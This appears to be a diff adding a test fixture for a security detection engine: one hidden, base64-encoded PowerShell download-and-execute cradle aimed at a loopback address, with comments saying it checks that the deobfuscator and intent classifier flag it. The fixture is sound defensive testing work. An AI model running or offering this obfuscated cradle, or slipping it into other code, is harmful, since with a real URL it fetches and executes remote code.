@@ -1,0 +1,8 @@
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwBzAGUAbgB0AGkAbgBlAGwALQBzAGEAbQBwAGwAZQAnACkA
+# Synthetic obfuscated script-cradle (TEXT ONLY — never executed). It models the
+# classic download-and-execute pattern: a hidden PowerShell with an -EncodedCommand
+# (UTF-16LE base64) that decodes to:
+#   IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/sentinel-sample')
+# The URL is loopback so the simulator is inert. Used to prove the engine's
+# deobfuscator peels the base64 layer and the intent classifier flags
+# download_execute + in_memory_execution + encoded_command.
